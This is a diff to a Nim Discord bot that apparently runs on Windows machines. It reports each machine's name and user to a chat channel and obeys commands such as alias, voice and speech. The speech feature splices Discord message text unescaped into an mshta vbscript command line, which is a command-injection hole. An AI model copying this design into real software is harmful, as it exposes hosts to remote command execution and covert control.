@@ -2,30 +2,40 @@ import dimscord, asyncdispatch, options, os, strutils, osproc
 import dotenv
 import constants
 import checkForUpdates
+import json
 
 let env = initDotEnv()
 env.load()
-
-const CHANNEL*: string = "847087245605601290"
 
 let THISPC*: string = getEnv("COMPUTERNAME")
 let TOKEN*: string = getEnv("TOKEN")
 
 var THISPCSTR*: string = "`" & THISPC & "`: "
-var alias: string = "xxxxxx"
-
-try:
-  let aliasFile = readFile("alias")
-
-  alias = aliasFile
-
-  THISPCSTR = "`" & alias & "(" & THISPC & ")`: "
-except:
-  discard
+var alias: string = "noalias"
+var voiceNumber: int = 0
 
 let discord = newDiscordClient(TOKEN)
 
-proc showName(discord: DiscordClient) =
+proc writeSettings() =
+  let settings: JsonNode = %* {"alias": alias, "voiceNumber": voiceNumber}
+
+  writeFile("settings", $settings)
+
+proc readSettings() =
+  try:
+    let settingsRaw: string = readFile("settings")
+
+    let settings: JsonNode = parseJson settingsRaw
+
+    alias = getStr settings["alias"]
+    THISPCSTR = "`" & alias & "(" & THISPC & ")`: "
+
+    voiceNumber = getInt settings["voiceNumber"]
+  except:
+    writeSettings()
+    readSettings()
+
+proc showName(CHANNEL: string, discord: DiscordClient) =
   discard discord.api.sendMessage(
     CHANNEL,
     THISPCSTR & "started `" & $VERSION & "` as " & getEnv("USERNAME")
@@ -34,9 +44,12 @@ proc showName(discord: DiscordClient) =
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
   echo "Ready as " & $r.user
 
-  showName discord
+  readSettings()
+  showName("847087245605601290", discord)
 
 proc messageCreate(s: Shard, m: Message) {.event(discord).} =
+  let CHANNEL: string = m.channel_id
+
   case m.content
   of "!ping":
     discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "pong")
@@ -46,7 +59,7 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
     else:
       discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "eu o iubi doar pe maria:(")
   of "!list":
-    showName discord
+    showName(CHANNEL, discord)
   else:
     try:
       if m.content.startsWith(THISPC) or m.content.startsWith(alias):
@@ -110,14 +123,17 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
           discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "saying...")
 
           let errCode = (
-            execCmdEx("""mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""""" &
-                text & """"")(window.close)")""").exitCode
+            execCmdEx(
+              """mshta vbscript:Execute("Dim sapi:Set sapi = createObject(""sapi.spvoice""):Set sapi.Voice = sapi.GetVoices.Item(""" &
+              $voiceNumber & """):sapi.Speak(""""" & text &
+              """"")(window.close)")""").exitCode
           )
 
           discard await discord.api.sendMessage(
             CHANNEL,
             THISPCSTR & "ran with err code: " & $errCode
           )
+
         elif (command.startsWith("alias")):
           let alias_msg: string = command.split("alias ")[1]
 
@@ -125,11 +141,22 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
 
           THISPCSTR = "`" & alias & "(" & THISPC & ")`: "
 
-          writeFile("alias", alias)
+          writeSettings()
 
           discard await discord.api.sendMessage(
             CHANNEL,
             THISPCSTR & "new alias: `" & alias & "`"
+          )
+        elif (command.startsWith("voice")):
+          let voiceNumber_msg: string = command.split("voice ")[1]
+
+          voiceNumber = parseInt voiceNumber_msg
+
+          writeSettings()
+
+          discard await discord.api.sendMessage(
+            CHANNEL,
+            THISPCSTR & "new voice: `" & voiceNumber_msg & "`"
           )
 
         elif (command.startsWith("msg")):
